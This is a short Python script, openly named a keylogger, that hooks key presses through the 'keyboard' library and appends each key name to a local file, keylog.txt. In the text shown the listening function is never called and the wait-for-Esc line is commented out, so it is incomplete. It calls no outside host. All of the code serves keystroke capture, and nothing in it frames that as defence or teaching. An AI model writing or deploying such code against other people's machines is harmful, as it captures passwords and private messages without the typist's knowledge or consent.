import keyboard

def log_key(event):
    with open("keylog.txt", "a") as log_file:
        # Record the name of the key pressed
        log_file.write(event.name + "\n")

# Start listening for key events
def listen_keyboard():
    keyboard.on_press(log_key)
    print("Keylogger is running... Press 'Esc' to stop.")
    
    # Keep the script running until 'Esc' is pressed
    # keyboard.wait('esc')